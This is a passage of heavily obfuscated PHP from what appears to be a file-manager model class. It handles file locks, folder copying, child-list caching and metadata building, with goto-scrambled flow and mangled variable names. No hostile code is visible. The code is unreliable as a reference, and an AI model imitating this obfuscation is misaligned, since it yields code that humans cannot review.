$FšŒ‡’¦ ò); $this->_lockEvent($B­¸Ü‡ê®¡, array($B¬·©´›Ü[485], $B¬·©´›Ü[486]), $FšŒ‡’¦ ò); } public function lockWriteStart($eæ …±‡ğ„, $dÀêºí½ = '') { goto f¡°‰ÇÑÈ¦; f¡°‰ÇÑÈ¦: $aŞ‹‘²Œßö =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($aŞ‹‘²Œßö[483], $eæ …±‡ğ„); goto A…åµÀ‰ì; A…åµÀ‰ì: $c«®ôÍÉ‘• = 1; $this->_lockKey($aŞ‹‘²Œßö[487] . $eæ …±‡ğ„ . $aŞ‹‘²Œßö[92] . $dÀêºí½, $c«®ôÍÉ‘•); $this->_lockEvent($eæ …±‡ğ„, array($aŞ‹‘²Œßö[482], $aŞ‹‘²Œßö[484]), $c«®ôÍÉ‘•); goto B‹ò‹Üï˜; B‹ò‹Üï˜: $this->_lockParent($eæ …±‡ğ„, array($aŞ‹‘²Œßö[482], $aŞ‹‘²Œßö[484]), $c«®ôÍÉ‘•); $this->_lockCheckEnd($aŞ‹‘²Œßö[483], $eæ …±‡ğ„); goto c¸¬Îñ­ç–; c¸¬Îñ­ç–: } public function lockWriteEnd($Døçî”÷™Ä, $B‹©ØÂ÷†ë = '') { $bÄ±ØÖ„ =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $D„Üõˆ´¦Û = 0; $this->_lockKey($bÄ±ØÖ„[487] . $Døçî”÷™Ä . $bÄ±ØÖ„[92] . $B‹©ØÂ÷†ë, $D„Üõˆ´¦Û); $this->_lockEvent($Døçî”÷™Ä, array($bÄ±ØÖ„[482], $bÄ±ØÖ„[484]), $D„Üõˆ´¦Û); $this->_lockParent($Døçî”÷™Ä, array($bÄ±ØÖ„[482], $bÄ±ØÖ„[484]), $D„Üõˆ´¦Û); } public function lockMoveStart($aÜØ÷¢¼…) { goto eõ‚¿Ş¡‡ô; D¸Š¿ˆá: $DÙÁ÷ºğ £ = 1; $this->_lockKey($eÖÑ¢ŠÉ[488] . $aÜØ÷¢¼…, $DÙÁ÷ºğ £); $this->_lockEvent($aÜØ÷¢¼…, array($eÖÑ¢ŠÉ[482], $eÖÑ¢ŠÉ[483]), $DÙÁ÷ºğ £); goto A¢±‘Š´ ¼; eõ‚¿Ş¡‡ô: $eÖÑ¢ŠÉ =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÖÑ¢ŠÉ[484], $aÜØ÷¢¼…); goto D¸Š¿ˆá; A¢±‘Š´ ¼: $this->_lockParent($aÜØ÷¢¼…, array($eÖÑ¢ŠÉ[482], $eÖÑ¢ŠÉ[484]), $DÙÁ÷ºğ £); $this->_lockEvent($aÜØ÷¢¼…, array($eÖÑ¢ŠÉ[489], $eÖÑ¢ŠÉ[485], $eÖÑ¢ŠÉ[486]), $DÙÁ÷ºğ £); $this->_lockCheckEnd($eÖÑ¢ŠÉ[484], $aÜØ÷¢¼…); goto bÖ‰¯œ„Èç; bÖ‰¯œ„Èç: } public function lockMoveEnd($FƒÓ•¿Ï­Ç) { goto EƒµÁ‰¿îæ; EƒµÁ‰¿îæ: $C–è…èÛ¾™ =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $a—À”â×®º = 0; goto dÃŒÈÚµ‘; e‚ŸÈ§ËÊ: $this->_lockEvent($FƒÓ•¿Ï­Ç, array($C–è…èÛ¾™[489], $C–è…èÛ¾™[485], $C–è…èÛ¾™[486]), $a—À”â×®º); goto dÇ¥Î“‘ä; dÃŒÈÚµ‘: $this->_lockKey($C–è…èÛ¾™[488] . $FƒÓ•¿Ï­Ç, $a—À”â×®º); $this->_lockEvent($FƒÓ•¿Ï­Ç, array($C–è…èÛ¾™[482], $C–è…èÛ¾™[483]), $a—À”â×®º); $this->_lockParent($FƒÓ•¿Ï­Ç, array($C–è…èÛ¾™[482], $C–è…èÛ¾™[484]), $a—À”â×®º); goto e‚ŸÈ§ËÊ; dÇ¥Î“‘ä: } private function _lockCheck($FÊëè»¾îİ, $Cƒ¬˜œÚ‡…) { goto e„’õ‹¯¿‘; eç’æ³¨×·: CacheLock::setErrorMsg($FÙœ®ößÂ[154] . htmlspecialchars($b†ô¿Ş¤[$FÙœ®ößÂ[28]]) . $FÙœ®ößÂ[468] . $FÚ—ÉÇ´¤î); $this->_lockKey($DÏ‚Ï¬±¯Æ, 1); $this->_lockKey($DÏ‚Ï¬±¯Æ, 0); goto b„÷‹Œ‚Øî; Cá‘²Áƒ¢: $this->_lockTimeStart[$DÏ‚Ï¬±¯Æ] = timeFloat(); if (!is_array($b†ô¿Ş¤)) { return; } $FÚ—ÉÇ´¤î = LNG($FÙœ®ößÂ[490]); goto eç’æ³¨×·; e„’õ‹¯¿‘: $FÙœ®ößÂ =& $_SERVER[¿õñ]; $b†ô¿Ş¤ = $this->sourceInfo($Cƒ¬˜œÚ‡…); $DÏ‚Ï¬±¯Æ = $FÊëè»¾îİ . $FÙœ®ößÂ[92] . $Cƒ¬˜œÚ‡…; goto Cá‘²Áƒ¢; b„÷‹Œ‚Øî: $eê†¶ŠîÆ = array_reverse($this->parentLevelArray($b†ô¿Ş¤[$FÙœ®ößÂ[455]])); foreach ($eê†¶ŠîÆ as $e™Œ¿½Ş) { $DÏ‚Ï¬±¯Æ = $FÊëè»¾îİ . $FÙœ®ößÂ[491] . $e™Œ¿½Ş; if (CacheLock::lockGet($FÙœ®ößÂ[492] . $DÏ‚Ï¬±¯Æ)) { $b†ô¿Ş¤ = $this->sourceInfo($e™Œ¿½Ş); CacheLock::setErrorMsg($FÙœ®ößÂ[154] . htmlspecialchars($b†ô¿Ş¤[$FÙœ®ößÂ[28]]) . $FÙœ®ößÂ[468] . $FÚ—ÉÇ´¤î); $this->_lockKey($DÏ‚Ï¬±¯Æ, 1); $this->_lockKey($DÏ‚Ï¬±¯Æ, 0); } } goto CòÙ¢¨’; CòÙ¢¨’: } private function _lockCheckEnd($Eô™‰Ş…ìˆ, $aË„£òØŒ¬) { goto aÖ•æ·’»Ú; b’À˜œ¹¹á: if ($D–¢–¬¯İ > 0.5) { unset(self::$cacheSourceInfo[$B•àñÕ…Ê£[406] . $aË„£òØŒ¬]); } $A˜ŒÅ”·ŠŒ = $this->sourceInfo($aË„£òØŒ¬); if (!$A˜ŒÅ”·ŠŒ) { show_json(LNG($B•àñÕ…Ê£[101]), !1); } goto E‚ÜÎ‹ãˆë; aÖ•æ·’»Ú: $B•àñÕ…Ê£ =& $_SERVER[¿õñ]; $Aª©ÌôÒ¶« = $Eô™‰Ş…ìˆ . $B•àñÕ…Ê£[92] . $aË„£òØŒ¬; CacheLock::setErrorMsg($B•àñÕ…Ê£[358]); goto FÍª×Ç°ßŒ; FÍª×Ç°ßŒ: if (!isset($this->_lockTimeStart[$Aª©ÌôÒ¶«])) { return; } $D–¢–¬¯İ = timeFloat() - $this->_lockTimeStart[$Aª©ÌôÒ¶«]; unset($this->_lockTimeStart[$Aª©ÌôÒ¶«]); goto b’À˜œ¹¹á; E‚ÜÎ‹ãˆë: } private function _lockParent($F¦à´ãÂ¥, $fê„Ä¢ğìö, $bá½¾Ğ ÜÍ) { if (!$this->autoLockSet) { return; } $Eé‹°‹¨ß± = $this->sourceInfo($F¦à´ãÂ¥); if (!is_array($Eé‹°‹¨ß±)) { return; } $có¬Î‰ØœÙ = array_reverse($this->parentLevelArray($Eé‹°‹¨ß±[$_SERVER[¿õñ][455]])); foreach ($có¬Î‰ØœÙ as $Eˆ¢ ÖÀÜ) { $this->_lockEvent($Eˆ¢ ÖÀÜ, $fê„Ä¢ğìö, $bá½¾Ğ ÜÍ); } } private function _lockEvent($AÙîì¤ªïá, $B¹ÁÜ„˜ôº, $eÀá‘êÆ”) { $e¨À‹îˆÒ‚ =& $_SERVER[¿õñ]; if (!$this->autoLockSet) { return; } foreach ($B¹ÁÜ„˜ôº as $eİ½Ñò„Ã) { $DŸİìËÍŒ¸ = $eİ½Ñò„Ã . $e¨À‹îˆÒ‚[92] . $AÙîì¤ªïá; if ($eÀá‘êÆ” && CacheLock::lockGet($e¨À‹îˆÒ‚[492] . $DŸİìËÍŒ¸)) { continue; } $this->_lockKey($DŸİìËÍŒ¸, $eÀá‘êÆ”); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¨™ÈÄªù, $e†ÛØŒÍ— = 1) { $cÊ”µÊºÊ´ = $_SERVER[¿õñ][492] . $d¨™ÈÄªù; if ($e†ÛØŒÍ—) { if (isset(self::$_lockItemArr[$cÊ”µÊºÊ´])) { return; } self::$_lockItemArr[$cÊ”µÊºÊ´] = 1; CacheLock::lock($cÊ”µÊºÊ´, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$cÊ”µÊºÊ´])) { return; } unset(self::$_lockItemArr[$cÊ”µÊºÊ´]); CacheLock::unlock($cÊ”µÊºÊ´); } } public function isParentOf($Dğá«®¼Ù–, $Fğ›Œš) { goto Dôê‘¡ÏŠš; Dôê‘¡ÏŠš: $f´»‡ë­¢ =& $_SERVER[¿õñ]; $cƒ÷Ğ¦†‚â = $this->sourceInfo($Dğá«®¼Ù–); $CÎì„ƒîöí = $this->sourceInfo($Fğ›Œš); goto a™º–ÙÃ«¥; Cö‚·‰ñ: return $Bğ÷™½²öÏ; goto b„´”‹‘³Á; a™º–ÙÃ«¥: $Bœ…Ê÷Ú„ò = $cƒ÷Ğ¦†‚â[$f´»‡ë­¢[455]] . $cƒ÷Ğ¦†‚â[$f´»‡ë­¢[366]] . $f´»‡ë­¢[47]; $f©ÃøĞ¥©¡ = $CÎì„ƒîöí[$f´»‡ë­¢[455]] . $CÎì„ƒîöí[$f´»‡ë­¢[366]] . $f´»‡ë­¢[47]; $Bğ÷™½²öÏ = strpos($f©ÃøĞ¥©¡, $Bœ…Ê÷Ú„ò) === 0; goto Cö‚·‰ñ; b„´”‹‘³Á: } public function copy($f´Âñ¬Ñß¶, $DäÇÔßù‰±, $fÕ­ÛÂãİÍ = REPEAT_REPLACE, $e÷²ÀÆŞ± = '') { goto Dí„½Š­â›; Dí„½Š­â›: $cÕ‚Éå¡…÷ =& $_SERVER[¿õñ]; $fÜÏ‡Ù‚˜§ = $this->sourceInfo($f´Âñ¬Ñß¶); $A£è›È¡á = $this->sourceInfo($DäÇÔßù‰±); goto aÀµÇË‹Ãå; EõôÈÛœìÂ: $this->lockCopyEnd($f´Âñ¬Ñß¶); $this->lockWriteEnd($DäÇÔßù‰±, $a©êšö¬ ô); if ($fÜÏ‡Ù‚˜§[$cÕ‚Éå¡…÷[367]] == $cÕ‚Éå¡…÷[493] && $E¹¾…Ã»á == $eä…Œ’®Ö) { $this->folderSizeResetChildren($E¹¾…Ã»á); } goto F„Å¹±Ëéô; BÃ…½ŸïÒĞ: Model($cÕ‚Éå¡…÷[164])->linkAdd($C¡Ç²¢¡[$cÕ‚Éå¡…÷[494]]); $this->folderSizeReset($DäÇÔßù‰±); $this->updateModifyTime($DäÇÔßù‰±); goto A‰–Ÿò¯¦¡; cö°ëéÍµ¯: $this->lockCopyStart($f´Âñ¬Ñß¶); $this->lockWriteStart($DäÇÔßù‰±, $a©êšö¬ ô); $C¡Ç²¢¡ = array($cÕ‚Éå¡…÷[494] => array(), $cÕ‚Éå¡…÷[495] => array(), $cÕ‚Éå¡…÷[496] => array()); goto d½Œµ¼ù™Ô; d½Œµ¼ù™Ô: $E¹¾…Ã»á = $this->fileNameExistCache($DäÇÔßù‰±, $fÜÏ‡Ù‚˜§[$cÕ‚Éå¡…÷[28]]); $eä…Œ’®Ö = $this->_copy($f´Âñ¬Ñß¶, $DäÇÔßù‰±, $fÕ­ÛÂãİÍ, $C¡Ç²¢¡, !0, $e÷²ÀÆŞ±); $this->_childrenListClear(); goto EõôÈÛœìÂ; A‰–Ÿò¯¦¡: return $eä…Œ’®Ö; goto Eİ¾÷İëÓ¶; aÀµÇË‹Ãå: if (!$fÜÏ‡Ù‚˜§ || !$A£è›È¡á || $A£è›È¡á[$cÕ‚Éå¡…÷[367]] != $cÕ‚Éå¡…÷[493]) { return !1; } if ($this->isParentOf($f´Âñ¬Ñß¶, $DäÇÔßù‰±)) { return !1; } $a©êšö¬ ô = $e÷²ÀÆŞ± ? $e÷²ÀÆŞ± : $fÜÏ‡Ù‚˜§[$cÕ‚Éå¡…÷[28]]; goto cö°ëéÍµ¯; F„Å¹±Ëéô: Model($cÕ‚Éå¡…÷[497])->addAll($C¡Ç²¢¡[$cÕ‚Éå¡…÷[495]], array(), !0); if ($E¹¾…Ã»á != $eä…Œ’®Ö || $fÜÏ‡Ù‚˜§[$cÕ‚Éå¡…÷[367]] == $cÕ‚Éå¡…÷[493]) { Model($cÕ‚Éå¡…÷[498])->eventCopy($eä…Œ’®Ö); } $this->saveAll($C¡Ç²¢¡[$cÕ‚Éå¡…÷[496]]); goto BÃ…½ŸïÒĞ; Eİ¾÷İëÓ¶: } private function _copy($b•¡Ä—¡°, $CŠßî¼º×, $cìÌ¦Ü‘, &$Fß—¿Î²Ğ‘, $F×¬»­í¿Ñ, $f¼ì‡àöŞ˜ = '') { goto e„Ë¡†â«ª; e„Ë¡†â«ª: $b‚¦æİ¥Å‡ =& $_SERVER[¿õñ]; $c Âßê“Şù = $this->sourceInfoCache($b•¡Ä—¡°); $BæåÎ¨ö° = $c Âßê“Şù[$b‚¦æİ¥Å‡[367]] == $b‚¦æİ¥Å‡[493]; goto aÈÇÁ•¾ô‡; CÅê¿Ğ‚‚·: return $e…—®Ó‘İ; goto Aøƒ•ø®·„; aÈÇÁ•¾ô‡: $EÜäèøëâ® = $f¼ì‡àöŞ˜ ? $f¼ì‡àöŞ˜ : $c Âßê“Şù[$b‚¦æİ¥Å‡[28]]; $d„‘ÑìµØÉ = $this->fileNameExistCache($CŠßî¼º×, $EÜäèøëâ®); if ($F×¬»­í¿Ñ) { $this->_childrenAllMake($b•¡Ä—¡°); if ($BæåÎ¨ö° && $d„‘ÑìµØÉ) { $this->_childrenAllMake($d„‘ÑìµØÉ); } } goto EŠƒæ ˜É; EŠƒæ ˜É: if (!$d„‘ÑìµØÉ) { return $this->_copyCreate($b•¡Ä—¡°, $CŠßî¼º×, $EÜäèøëâ®, $Fß—¿Î²Ğ‘); } $e…—®Ó‘İ = $d„‘ÑìµØÉ; if ($BæåÎ¨ö°) { if ($cìÌ¦Ü‘ == REPEAT_RENAME_FOLDER) { $EÜäèøëâ® = $this->fileNameAutoCache($CŠßî¼º×, $EÜäèøëâ®, $cìÌ¦Ü‘, $BæåÎ¨ö°); $e…—®Ó‘İ = $this->_copyCreate($b•¡Ä—¡°, $CŠßî¼º×, $EÜäèøëâ®, $Fß—¿Î²Ğ‘); } else { $cØ‚àëğ¿ƒ = $this->_childrenList($b•¡Ä—¡°); foreach ($cØ‚àëğ¿ƒ as $b™Ş¬Õ°¶ó) { $this->_copy($b™Ş¬Õ°¶ó[$b‚¦æİ¥Å‡[366]], $d„‘ÑìµØÉ, $cìÌ¦Ü‘, $Fß—¿Î²Ğ‘, !1); } } } else { if ($cìÌ¦Ü‘ == REPEAT_RENAME || $cìÌ¦Ü‘ == REPEAT_RENAME_FOLDER) { $EÜäèøëâ® = $this->fileNameAutoCache($CŠßî¼º×, $EÜäèøëâ®, $cìÌ¦Ü‘, $BæåÎ¨ö°); $e…—®Ó‘İ = $this->_copyCreate($b•¡Ä—¡°, $CŠßî¼º×, $EÜäèøëâ®, $Fß—¿Î²Ğ‘); } else { if ($cìÌ¦Ü‘ == REPEAT_REPLACE) { $d±¤°ÏÄ©ä = $this->sourceInfoCache($d„‘ÑìµØÉ); $f¬ñ¹Û¨· = $this->fileHistory($d±¤°ÏÄ©ä, $c Âßê“Şù[$b‚¦æİ¥Å‡[415]], $c Âßê“Şù[$b‚¦æİ¥Å‡[78]]); if ($f¬ñ¹Û¨·) { $Fß—¿Î²Ğ‘[$b‚¦æİ¥Å‡[494]][] = $c Âßê“Şù[$b‚¦æİ¥Å‡[415]]; } } else { if ($cìÌ¦Ü‘ == REPEAT_SKIP) { } } } Hook::trigger($b‚¦æİ¥Å‡[499], array($b‚¦æİ¥Å‡[500], $c Âßê“Şù, 0)); } goto CÅê¿Ğ‚‚·; Aøƒ•ø®·„: } private function _copyCreate($b‹‰âƒ¦„ã, $a™ŠõöÖĞÏ, $f‡Î›ç†ÓÚ, &$FÂƒÒÂ) { goto Aø˜å»¨·; CÃ ²Ã¤õ§: $this->chunkEventSet($f©—óà³¶—[508], array($f©—óà³¶—[509], $dî§øîéÁ, $A•Î—’†¡)); $this->saveAll($CÜŒƒ¨¹È); return $AÈé”ÑåíÊ; goto A†ŞŠßĞ’; A‡ç—ÁÏ³Ö: $this->_childrenListAll($b‹‰âƒ¦„ã, $fØõ½×Ó•¸); $A•Î—’†¡ = count($fØõ½×Ó•¸); if ($A•Î—’†¡ == 0) { return $AÈé”ÑåíÊ; } goto c‘–Éñ‡·¸; F¶¼Ëªé›÷: $AÈé”ÑåíÊ = $this->add($dî§øîéÁ); $a‚‘±½½–ß = array($f©—óà³¶—[366] => $AÈé”ÑåíÊ, $f©—óà³¶—[28] => $f‡Î›ç†ÓÚ); $this->_copyApplyMeta($a‚‘±½½–ß, $FÂƒÒÂ); goto AÈ¢ğ‡È¢; CƒÃãŠŸ‰Ã: $D¹†ö›Ÿ…Ã[$b‹‰âƒ¦„ã] = $AÈé”ÑåíÊ; $bà”«Æí˜Š = array(); $CÜŒƒ¨¹È = array(); goto fç˜’ó–±ç; fç˜’ó–±ç: foreach ($FîãÌ­ as $D½Ì–à¼Ğ«) { $EšÖ¨Š‹ö = $D½Ì–à¼Ğ«[$f©—óà³¶—[366]]; $D“Ó„æˆ¤´ = $this->_childrenMatch($D¹†ö›Ÿ…Ã, $D½Ì–à¼Ğ«, $d¸¶¾©¤‘…); $bà”«Æí˜Š[] = array($f©—óà³¶—[366], $EšÖ¨Š‹ö, $f©—óà³¶—[457], $D“Ó„æˆ¤´[$f©—óà³¶—[457]]); $CÜŒƒ¨¹È[] = array($f©—óà³¶—[366], $EšÖ¨Š‹ö, $f©—óà³¶—[455], $D“Ó„æˆ¤´[$f©—óà³¶—[455]]); $this->_copyApplyMeta($D½Ì–à¼Ğ«, $FÂƒÒÂ); if ($D½Ì–à¼Ğ«[$f©—óà³¶—[367]] != $f©—óà³¶—[493]) { $FÂƒÒÂ[$f©—óà³¶—[494]][] = $D½Ì–à¼Ğ«[$f©—óà³¶—[415]]; } } $this->chunkEventSet($f©—óà³¶—[506], array($f©—óà³¶—[507], $dî§øîéÁ, $A•Î—’†¡)); $this->saveAll($bà”«Æí˜Š); goto CÃ ²Ã¤õ§; E’„ì®¼²: $this->addAll($aÆÅ›²Èİ, array(), !1); $FîãÌ­ = $this->where(array($f©—óà³¶—[457] => $AÈé”ÑåíÊ))->select(); $D¹†ö›Ÿ…Ã = $this->_childrenMakeRelation($fØõ½×Ó•¸, $FîãÌ­); goto CƒÃãŠŸ‰Ã; AÈ¢ğ‡È¢: if ($bÛØ²‹Õï¹[$f©—óà³¶—[367]] != $f©—óà³¶—[493]) { $FÂƒÒÂ[$f©—óà³¶—[494]][] = $bÛØ²‹Õï¹[$f©—óà³¶—[415]]; return $AÈé”ÑåíÊ; } $fØõ½×Ó•¸ = array(); $aÆÅ›²Èİ = array(); goto A‡ç—ÁÏ³Ö; Aø˜å»¨·: $f©—óà³¶— =& $_SERVER[¿õñ]; $bÛØ²‹Õï¹ = $this->sourceInfoCache($b‹‰âƒ¦„ã); $féº§Ú¼ªÙ = $this->sourceInfoCache($a™ŠõöÖĞÏ); goto E‰Š˜ãˆöö; E‰Š˜ãˆöö: $dî§øîéÁ = $this->_makeItemData($bÛØ²‹Õï¹, $féº§Ú¼ªÙ, $f‡Î›ç†ÓÚ); Hook::trigger($f©—óà³¶—[501], $dî§øîéÁ); Hook::trigger($f©—óà³¶—[502], array($f©—óà³¶—[503], $dî§øîéÁ, 0)); goto F¶¼Ëªé›÷; c‘–Éñ‡·¸: $d¸¶¾©¤‘… = $this->sourceInfo($AÈé”ÑåíÊ); foreach ($fØõ½×Ó•¸ as $D½Ì–à¼Ğ«) { $e°”Ø–ƒ…š = $this->_makeItemData($D½Ì–à¼Ğ«, $d¸¶¾©¤‘…, $D½Ì–à¼Ğ«[$f©—óà³¶—[28]]); $e°”Ø–ƒ…š[$f©—óà³¶—[455]] = $D½Ì–à¼Ğ«[$f©—óà³¶—[455]]; $aÆÅ›²Èİ[] = $e°”Ø–ƒ…š; } $this->chunkEventSet($f©—óà³¶—[504], array($f©—óà³¶—[505], $dî§øîéÁ, $A•Î—’†¡)); goto E’„ì®¼²; A†ŞŠßĞ’: } private function _childrenMakeRelation($CÔ® æ³•, $cÅ´¼‰—) { $BÖ…¥ŞÚ« =& $_SERVER[¿õñ]; $fÊ“•à²± = array(); $E„•â¼†º = array(); foreach ($CÔ® æ³• as $d¡ùÍãİ¬) { $eŒáƒçòìÊ = $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[28]] . $BÖ…¥ŞÚ«[8] . $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[455]]; $fÊ“•à²±[$eŒáƒçòìÊ] = $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[366]]; } foreach ($cÅ´¼‰— as $d¡ùÍãİ¬) { $eŒáƒçòìÊ = $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[28]] . $BÖ…¥ŞÚ«[8] . $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[455]]; $A¾ÀöäòÄÃ = $fÊ“•à²±[$eŒáƒçòìÊ]; $E„•â¼†º[$A¾ÀöäòÄÃ] = $d¡ùÍãİ¬[$BÖ…¥ŞÚ«[366]]; } return $E„•â¼†º; } private function _childrenMatch($BÆİ¸ááä­, $bïŠØÈñ‹, $e‡×Øí§’ô) { goto a‰À›Ç­ø†; fèÏåĞ½ãí: $e„Ï¥ƒÉ¢˜ = $eÙçŒ ºõ[count($eÙçŒ ºõ) - 1]; return array($FÜ¿‹ïï¯‹[457] => $e„Ï¥ƒÉ¢˜, $FÜ¿‹ïï¯‹[455] => $aç¬š™çˆ÷); goto A‚ïëí¿´; BîÃãÅª©‘: foreach ($f©™‘¨õ‚† as $aõ×³ğÏº) { if (isset($BÆİ¸ááä­[$aõ×³ğÏº])) { $aç¬š™çˆ÷ .= $BÆİ¸ááä­[$aõ×³ğÏº] . $FÜ¿‹ïï¯‹[510]; } } $aç¬š™çˆ÷ = rtrim($aç¬š™çˆ÷, $FÜ¿‹ïï¯‹[47]) . $FÜ¿‹ïï¯‹[47]; $eÙçŒ ºõ = $this->parentLevelArray($aç¬š™çˆ÷); goto fèÏåĞ½ãí; a‰À›Ç­ø†: $FÜ¿‹ïï¯‹ =& $_SERVER[¿õñ]; $aç¬š™çˆ÷ = $e‡×Øí§’ô[$FÜ¿‹ïï¯‹[455]]; $f©™‘¨õ‚† = $this->parentLevelArray($bïŠØÈñ‹[$FÜ¿‹ïï¯‹[455]]); goto BîÃãÅª©‘; A‚ïëí¿´: } private function _makeItemData($bÁ×çäøÔ, $b‹”Ñ“×œ•, $A¬°Ó¤©‰«) { $eº©ï©¡ÜØ =& $_SERVER[¿õñ]; $béĞÍ–èÇ = array($eº©ï©¡ÜØ[511] => $bÁ×çäøÔ[$eº©ï©¡ÜØ[367]], $eº©ï©¡ÜØ[383] => $A¬°Ó¤©‰«, $eº©ï©¡ÜØ[512] => $bÁ×çäøÔ[$eº©ï©¡ÜØ[369]], $eº©ï©¡ÜØ[416] => $bÁ×çäøÔ[$eº©ï©¡ÜØ[415]], $eº©ï©¡ÜØ[513] => $bÁ×çäøÔ[$eº©ï©¡ÜØ[78]], $eº©ï©¡ÜØ[514] => $b‹”Ñ“×œ•[$eº©ï©¡ÜØ[368]], $eº©ï©¡ÜØ[515] => $b‹”Ñ“×œ•[$eº©ï©¡ÜØ[452]], $eº©ï©¡ÜØ[516] => USER_ID, $eº©ï©¡ÜØ[517] => USER_ID, $eº©ï©¡ÜØ[365] => $b‹”Ñ“×œ•[$eº©ï©¡ÜØ[366]], $eº©ï©¡ÜØ[518] => $b‹”Ñ“×œ•[$eº©ï©¡ÜØ[455]] . $b‹”Ñ“×œ•[$eº©ï©¡ÜØ[366]] . $eº©ï©¡ÜØ[47], $eº©ï©¡ÜØ[392] => 0); return $béĞÍ–èÇ; } private function _copyApplyMeta($f¨Ê¾Ûä, &$d©Åù¶òÚ) { $bäİõ±ª½ó =& $_SERVER[¿õñ]; $c·ãóêËŸ« = $f¨Ê¾Ûä[$bäİõ±ª½ó[366]]; $C³½ÑäˆˆŒ = $f¨Ê¾Ûä[$bäİõ±ª½ó[28]]; if (!isset($f¨Ê¾Ûä[$bäİõ±ª½ó[519]]) || !$f¨Ê¾Ûä[$bäİõ±ª½ó[519]] || $f¨Ê¾Ûä[$bäİõ±ª½ó[519]] == $bäİõ±ª½ó[464]) { $d©Åù¶òÚ[$bäİõ±ª½ó[496]][] = array($bäİõ±ª½ó[366], $c·ãóêËŸ«, $bäİõ±ª½ó[519], short_id($c·ãóêËŸ«)); } if (Input::check($C³½ÑäˆˆŒ, $bäİõ±ª½ó[520])) { $d©Åù¶òÚ[$bäİõ±ª½ó[495]][] = array($bäİõ±ª½ó[366] => $c·ãóêËŸ«, $bäİõ±ª½ó[88] => $bäİõ±ª½ó[412], $bäİõ±ª½ó[354] => str_replace($bäİõ±ª½ó[50], $bäİõ±ª½ó[33], Pinyin::encode($C³½ÑäˆˆŒ))); $d©Åù¶òÚ[$bäİõ±ª½ó[495]][] = array($bäİõ±ª½ó[366] => $c·ãóêËŸ«, $bäİõ±ª½ó[88] => $bäİõ±ª½ó[411], $bäİõ±ª½ó[354] => Pinyin::encode($C³½ÑäˆˆŒ, $bäİõ±ª½ó[521])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($AÕ¾ÌåÃƒì) { goto Eâªô±šë‹; AÛ®•Ôñ¹¡: $dä°Ôİ˜¦Í = array($d·á«¡ÉÒ’[455] => array($d·á«¡ÉÒ’[475], $fåâŞÒØ´Ö[$d·á«¡ÉÒ’[455]] . $AÕ¾ÌåÃƒì . $d·á«¡ÉÒ’[476]), $d·á«¡ÉÒ’[393] => 0); $B‘Î¿Â‡àÕ = $this->field($D±×÷Â”Šğ)->where($dä°Ôİ˜¦Í)->select(); if (!$B‘Î¿Â‡àÕ) { return; } goto f‹âÎöÇ¹·; f‹âÎöÇ¹·: $B‘Î¿Â‡àÕ = array_to_keyvalue($B‘Î¿Â‡àÕ, $d·á«¡ÉÒ’[366]); foreach ($B‘Î¿Â‡àÕ as $B´¡‚Î” Å) { $E¼¥Š½³œç = $B´¡‚Î” Å[$d·á«¡ÉÒ’[457]]; $AÕ¾ÌåÃƒì = $B´¡‚Î” Å[$d·á«¡ÉÒ’[366]]; if (!isset($this->_childrenListCache[$AÕ¾ÌåÃƒì]) && $B´¡‚Î” Å[$d·á«¡ÉÒ’[367]] == $d·á«¡ÉÒ’[493]) { $this->_childrenListCache[$AÕ¾ÌåÃƒì] = array(); } if (!isset($this->_childrenListCache[$E¼¥Š½³œç])) { $this->_childrenListCache[$E¼¥Š½³œç] = array(); } $this->_childrenListCache[$E¼¥Š½³œç][$AÕ¾ÌåÃƒì] = $B´¡‚Î” Å; $this->_childrenItemCache[$AÕ¾ÌåÃƒì] = $B´¡‚Î” Å; } goto b­ê¶µá†Ü; Eâªô±šë‹: $d·á«¡ÉÒ’ =& $_SERVER[¿õñ]; $fåâŞÒØ´Ö = $this->sourceInfo($AÕ¾ÌåÃƒì); $D±×÷Â”Šğ = $d·á«¡ÉÒ’[522]; goto AÛ®•Ôñ¹¡; b­ê¶µá†Ü: } private function _childrenListAll($c“œ’İ±Œâ, &$D…©ŠœñŸ) { $aã•Å¦ç¤ =& $_SERVER[¿õñ]; if (!isset($this->_childrenListCache[$c“œ’İ±Œâ])) { return; } $eœ†Ô–…‹İ = $this->_childrenListCache[$c“œ’İ±Œâ]; foreach ($eœ†Ô–…‹İ as $dñõà»†èÏ => $aô‚ºóš‚) { $D…©ŠœñŸ[$dñõà»†èÏ] = $aô‚ºóš‚; if ($aô‚ºóš‚[$aã•Å¦ç¤[367]] == $aã•Å¦ç¤[493]) { $this->_childrenListAll($dñõà»†èÏ, $D…©ŠœñŸ); } } } private function sourceInfoCache($FñË…‡¾ã) { if (isset($this->_childrenItemCache[$FñË…‡¾ã])) { return $this->_childrenItemCache[$FñË…‡¾ã]; } return $this->sourceInfo($FñË…‡¾ã); } private function _childrenList($C“Üœää†â) { if (isset($this->_childrenListCache[$C“Üœää†â])) { return $this->_childrenListCache[$C“Üœää†â]; } return $this->_childrenListSelect($C“Üœää†â); } private function _childrenListSelect($bÍà¿Ê“Ù²) { goto CÏÒó½‰ŒÁ; CÏÒó½‰ŒÁ: $AË¸šÊóŸ½ =& $_SERVER[¿õñ]; $f‰Ö·¯ØÃ¥ = array($AË¸šÊóŸ½[457] => $bÍà¿Ê“Ù², $AË¸šÊóŸ½[393] => 0); $dóĞ¸“˜±¹ = $this->where($f‰Ö·¯ØÃ¥)->select(); goto DĞİÕ…ì…Æ; DĞİÕ…ì…Æ: $dóĞ¸“˜±¹ = $dóĞ¸“˜±¹ ? $dóĞ¸“˜±¹ : array(); $D±¡¾È¸Ÿ = array_to_keyvalue($dóĞ¸“˜±¹, $AË¸šÊóŸ½[366]); $this->_childrenListCache[$bÍà¿Ê“Ù²] = $D±¡¾È¸Ÿ; goto F™Çƒµ¬”Ó; F™Çƒµ¬”Ó: foreach ($D±¡¾È¸Ÿ as $bÍà¿Ê“Ù² => $E‹£‚Ä¯³„) { 